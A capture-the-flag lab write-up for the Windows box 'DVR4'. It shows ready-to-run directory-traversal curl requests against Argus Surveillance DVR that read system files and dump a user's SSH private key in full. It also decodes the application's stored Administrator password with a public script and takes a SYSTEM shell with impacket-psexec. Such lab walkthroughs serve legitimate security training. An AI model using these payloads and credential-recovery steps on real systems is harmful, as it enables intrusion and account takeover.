---
machine: DVR4
platform: Proving Grounds
category: Windows
difficulty: Hard
tags: [argus-surveillance-dvr, directory-traversal, arbitrary-file-read, weak-password-encryption, ssh-key-theft, psexec]
date: 2026-08-28
status: retired
summary: A Windows box running Argus Surveillance DVR — testing exploitation of a public directory-traversal vulnerability for arbitrary file reads, theft of a leaked SSH private key for a foothold, and reversal of the application's proprietary weak password-encryption scheme to recover local administrator credentials for the path to SYSTEM.
---

## Enumeration

nmap scan:

```bash
┌──(kali㉿kali)-[~/oscp/dvr4/nmapscan]
└─$ nmap-full 192.168.189.179
[*] Running fast port discovery on 192.168.189.179...
[sudo] password for kali: 
[*] Open ports: 22,135,139,445,5040,8080,49664,49665,49666,49667,49668,49669
[*] Running full scan on 192.168.189.179...
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-28 06:24 -0400
Nmap scan report for 192.168.189.179
Host is up (0.058s latency).

PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           Bitvise WinSSHD 8.48 (FlowSsh 8.48; protocol 2.0; non-commercial use)
| ssh-hostkey: 
|   3072 21:25:f0:53:b4:99:0f:34:de:2d:ca:bc:5d:fe:20:ce (RSA)
|_  384 e7:96:f3:6a:d8:92:07:5a:bf:37:06:86:0a:31:73:19 (ECDSA)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
8080/tcp  open  http-proxy
|_http-title: Argus Surveillance DVR
|_http-generator: Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Connection: Keep-Alive
|     Keep-Alive: timeout=15, max=4
|     Content-Type: text/html
|     Content-Length: 985
|     <HTML>
|     <HEAD>
|     <TITLE>
|     Argus Surveillance DVR
|     </TITLE>
|     <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
|     <meta name="GENERATOR" content="Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]">
|     <frameset frameborder="no" border="0" rows="75,*,88">
|     <frame name="Top" frameborder="0" scrolling="auto" noresize src="CamerasTopFrame.html" marginwidth="0" marginheight="0"> 
|     <frame name="ActiveXFrame" frameborder="0" scrolling="auto" noresize src="ActiveXIFrame.html" marginwidth="0" marginheight="0">
|     <frame name="CamerasTable" frameborder="0" scrolling="auto" noresize src="CamerasBottomFrame.html" marginwidth="0" marginheight="0"> 
|     <noframes>
|     <p>This page uses frames, but your browser doesn't support them.</p>
|_    </noframes>
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.99%I=7%D=8/28%Time=6A9161D6%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,451,"HTTP/1\.1\x20200\x20OK\r\nConnection:\x20Keep-Alive\r\nKe
SF:ep-Alive:\x20timeout=15,\x20max=4\r\nContent-Type:\x20text/html\r\nCont
SF:ent-Length:\x20985\r\n\r\n<HTML>\r\n<HEAD>\r\n<TITLE>\r\nArgus\x20Surve
SF:illance\x20DVR\r\n</TITLE>\r\n\r\n<meta\x20http-equiv=\"Content-Type\"\
SF:x20content=\"text/html;\x20charset=ISO-8859-1\">\r\n<meta\x20name=\"GEN
SF:ERATOR\"\x20content=\"Actual\x20Drawing\x206\.0\x20\(http://www\.pysoft
SF:\.com\)\x20\[PYSOFTWARE\]\">\r\n\r\n<frameset\x20frameborder=\"no\"\x20
SF:border=\"0\"\x20rows=\"75,\*,88\">\r\n\x20\x20<frame\x20name=\"Top\"\x2
SF:0frameborder=\"0\"\x20scrolling=\"auto\"\x20noresize\x20src=\"CamerasTo
SF:pFrame\.html\"\x20marginwidth=\"0\"\x20marginheight=\"0\">\x20\x20\r\n\
SF:x20\x20<frame\x20name=\"ActiveXFrame\"\x20frameborder=\"0\"\x20scrollin
SF:g=\"auto\"\x20noresize\x20src=\"ActiveXIFrame\.html\"\x20marginwidth=\"
SF:0\"\x20marginheight=\"0\">\r\n\x20\x20<frame\x20name=\"CamerasTable\"\x
SF:20frameborder=\"0\"\x20scrolling=\"auto\"\x20noresize\x20src=\"CamerasB
SF:ottomFrame\.html\"\x20marginwidth=\"0\"\x20marginheight=\"0\">\x20\x20\
SF:r\n\x20\x20<noframes>\r\n\x20\x20\x20\x20<p>This\x20page\x20uses\x20fra
SF:mes,\x20but\x20your\x20browser\x20doesn't\x20support\x20them\.</p>\r\n\
SF:x20\x20</noframes>\r")%r(HTTPOptions,451,"HTTP/1\.1\x20200\x20OK\r\nCon
SF:nection:\x20Keep-Alive\r\nKeep-Alive:\x20timeout=15,\x20max=4\r\nConten
SF:t-Type:\x20text/html\r\nContent-Length:\x20985\r\n\r\n<HTML>\r\n<HEAD>\
SF:r\n<TITLE>\r\nArgus\x20Surveillance\x20DVR\r\n</TITLE>\r\n\r\n<meta\x20
SF:http-equiv=\"Content-Type\"\x20content=\"text/html;\x20charset=ISO-8859
SF:-1\">\r\n<meta\x20name=\"GENERATOR\"\x20content=\"Actual\x20Drawing\x20
SF:6\.0\x20\(http://www\.pysoft\.com\)\x20\[PYSOFTWARE\]\">\r\n\r\n<frames
SF:et\x20frameborder=\"no\"\x20border=\"0\"\x20rows=\"75,\*,88\">\r\n\x20\
SF:x20<frame\x20name=\"Top\"\x20frameborder=\"0\"\x20scrolling=\"auto\"\x2
SF:0noresize\x20src=\"CamerasTopFrame\.html\"\x20marginwidth=\"0\"\x20marg
SF:inheight=\"0\">\x20\x20\r\n\x20\x20<frame\x20name=\"ActiveXFrame\"\x20f
SF:rameborder=\"0\"\x20scrolling=\"auto\"\x20noresize\x20src=\"ActiveXIFra
SF:me\.html\"\x20marginwidth=\"0\"\x20marginheight=\"0\">\r\n\x20\x20<fram
SF:e\x20name=\"CamerasTable\"\x20frameborder=\"0\"\x20scrolling=\"auto\"\x
SF:20noresize\x20src=\"CamerasBottomFrame\.html\"\x20marginwidth=\"0\"\x20
SF:marginheight=\"0\">\x20\x20\r\n\x20\x20<noframes>\r\n\x20\x20\x20\x20<p
SF:>This\x20page\x20uses\x20frames,\x20but\x20your\x20browser\x20doesn't\x
SF:20support\x20them\.</p>\r\n\x20\x20</noframes>\r");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

We can searchsploit `argus` running on port 8080:

```bash
┌──(kali㉿kali)-[~/oscp/dvr4]
└─$ searchsploit argus 
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Argus Surveillance DVR 4.0 - Unquoted Service Path                                                                        | windows/local/50261.txt
Argus Surveillance DVR 4.0 - Weak Password Encryption                                                                     | windows/local/50130.py
Argus Surveillance DVR 4.0.0.0 - Directory Traversal                                                                      | windows_x86/webapps/45296.txt
Argus Surveillance DVR 4.0.0.0 - Privilege Escalation                                                                     | windows_x86/local/45312.c
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

## Foothold

We can utilize the directory traversal exploit:

```bash
┌──(kali㉿kali)-[~/oscp/dvr4]
└─$ curl "http://target:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="

; for 16-bit app support
[386Enh]
woafont=dosapp.fon
EGA80WOA.FON=EGA80WOA.FON
EGA40WOA.FON=EGA40WOA.FON
CGA80WOA.FON=CGA80WOA.FON
CGA40WOA.FON=CGA40WOA.FON

[drivers]
wave=mmdrv.dll
timer=timer.drv

[mci]
```

We can use this exploit to perform arbitrary file reads on the box. I try to read for stored argus credentials but the result turns up empty.

```bash
curl "http://target:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FProgramData%2FPY_Software%2FArgus%20Surveillance%20DVR%2FDVRParams.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
[Main]
ServerName=
ServerLocation=
ServerDescription=
ReadH=0
UseDialUp=0
DialUpConName=
DialUpDisconnectWhenDone=0
DIALUPUSEDEFAULTS" checked checked
```

We can try to find `ssh` keys relating to the users we find in the Users tab:

![Argus Surveillance DVR admin panel Users tab listing configured accounts](/media/Pasted%20image%2020260828054905.png)

We actually manage to find an `id_rsa` private key for `Viewer`:

```bash
┌──(kali㉿kali)-[~/oscp/dvr4]
└─$ curl "http://target:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%5CViewer%5C.ssh%5Cid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

We can paste this into a file, chmod 700 it, and then ssh into the server.

```bash
┌──(kali㉿kali)-[~/oscp/dvr4]
└─$ mousepad viewer.priv
  
┌──(kali㉿kali)-[~/oscp/dvr4]
└─$ chmod 700 viewer.priv 

┌──(kali㉿kali)-[~/oscp/dvr4]
└─$ ssh -i viewer.priv Viewer@target
Microsoft Windows [Version 10.0.19044.1645]
(c) Microsoft Corporation. All rights reserved.

C:\Users\viewer>whoami
dvr4\viewer
```

We can retrieve the local.txt flag from the Viewer's Desktop directory.

## Privilege Escalation

Using this shell we can read the previous `C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini` and find encoded password for Administrator

```text
LoginName0=Administrator                                                                                                                                    
FullName0=60CAAAFEC8753F7EE03B3B76C875EB607359F641D9BDD9BD8998AAFEEB60E03B7359E1D08998CA797359F641418D4D7BC875EB60C8759083E03BB740CA79C875EB603CD97359D9BDF6
414D7BB740CA79F6419083                                                                                                                                      
FullControl0=1                                                                                                                                              
CanClose0=1                                                                                                                                                 
CanPlayback0=1                                                                                                                                              
CanPTZ0=1                                                                                                                                                   
CanRecord0=1                                                                                                                                                
CanConnect0=1                                                                                                                                               
CanReceiveAlerts0=1                                                                                                                                         
CanViewLogs0=1                                                                                                                                              
CanViewCamerasNumber0=0                                                                                                                                     
CannotBeRemoved0=1                                                                                                                                          
MaxConnectionTimeInMins0=0                                                                                                                                  
DailyTimeLimitInMins0=0                                                                                                                                     
MonthlyTimeLimitInMins0=0                                                                                                                                   
DailyTrafficLimitInKB0=0                                                                                                                                    
MonthlyTrafficLimitInKB0=0                                                                                                                                  
MaxStreams0=0                                                                                                                                               
MaxViewers0=0                                                                                                                                               
MaximumBitrateInKb0=0                                                                                                                                       
AccessFromIPsOnly0=                                                                                                                                         
AccessRestrictedForIPs0=                                                                                                                                    
MaxBytesSent0=0                                                                                                                                             
Password0=ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8                                                                                                      
Description0=60CAAAFEC8753F7EE03B3B76C875EB607359F641D9BDD9BD8998AAFEEB60E03B7359E1D08998CA797359F641418D4D7BC875EB60C8759083E03BB740CA79C875EB603CD97359D9B
DF6414D7BB740CA79F6419083  
```

We can use the weak password encryption PoC from our earlier searchsploit to read these encoded values.

FullName0:

```bash
┌──(kali㉿kali)-[~/oscp/dvr4/nmapscan]
└─$ python3 50130.py 
/home/kali/oscp/dvr4/nmapscan/50130.py:30: SyntaxWarning: invalid escape sequence '\_'
  #   /  _  \_______  ____  __ __  ______ #

#########################################
#    _____ Surveillance DVR 4.0         #
#   /  _  \_______  ____  __ __  ______ #
#  /  /_\  \_  __ \/ ___\|  |  \/  ___/ #
# /    |    \  | \/ /_/  >  |  /\___ \  #
# \____|__  /__|  \___  /|____//____  > #
#         \/     /_____/            \/  #
#        Weak Password Encryption       #
############ @deathflash1411 ############

[+] 60CA:B
[+] AAFE:u
[+] C875:i
[+] 3F7E:l
[+] E03B:t
[-] 3B76:Unknown
[+] C875:i
[+] EB60:n
[-] 7359:Unknown
[+] F641:a
[+] D9BD:c
[+] D9BD:c
[+] 8998:o
[+] AAFE:u
[+] EB60:n
[+] E03B:t
[-] 7359:Unknown
[+] E1D0:f
[+] 8998:o
[+] CA79:r
[-] 7359:Unknown
[+] F641:a
[+] 418D:d
[+] 4D7B:m
[+] C875:i
[+] EB60:n
[+] C875:i
[+] 9083:s
[+] E03B:t
[+] B740:e
[+] CA79:r
[+] C875:i
[+] EB60:n
[+] 3CD9:g
[-] 7359:Unknown
[+] D9BD:c
[+] F641:a
[+] 4D7B:m
[+] B740:e
[+] CA79:r
[+] F641:a
[+] 9083:s
```

Password0:

```bash
┌──(kali㉿kali)-[~/oscp/dvr4/nmapscan]
└─$ python3 50130.py 
/home/kali/oscp/dvr4/nmapscan/50130.py:30: SyntaxWarning: invalid escape sequence '\_'
  #   /  _  \_______  ____  __ __  ______ #

#########################################
#    _____ Surveillance DVR 4.0         #
#   /  _  \_______  ____  __ __  ______ #
#  /  /_\  \_  __ \/ ___\|  |  \/  ___/ #
# /    |    \  | \/ /_/  >  |  /\___ \  #
# \____|__  /__|  \___  /|____//____  > #
#         \/     /_____/            \/  #
#        Weak Password Encryption       #
############ @deathflash1411 ############

[+] ECB4:1
[+] 53D1:4
[+] 6069:W
[+] F641:a
[+] E03B:t
[+] D9BD:c
[+] 956B:h
[+] FE36:D
[+] BD8F:0
[+] 3CD9:g
[-] D9A8:Unknown
```

For the unknown character D9A8 we can look it up and find:

```text
# Updated character mapping including D9A8 characters = { # ... other mappings ... 'D9A8': '$' }
```

The Administrator account seems to have a password of `14WatchD0g$`

We can use psexec to gain a shell as system using these local administrator credentials:

```bash
┌──(kali㉿kali)-[~/oscp/dvr4/nmapscan]
└─$ impacket-psexec Administrator:'14WatchD0g$'@192.168.189.179
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 192.168.189.179.....
[*] Found writable share ADMIN$
[*] Uploading file qSYxHrLM.exe
[*] Opening SVCManager on 192.168.189.179.....
[*] Creating service lGvw on 192.168.189.179.....
[*] Starting service lGvw.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19044.1645]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>
```

From here we have a SYSTEM shell and can retrieve the flag from Administrator's Desktop. Box compromised.
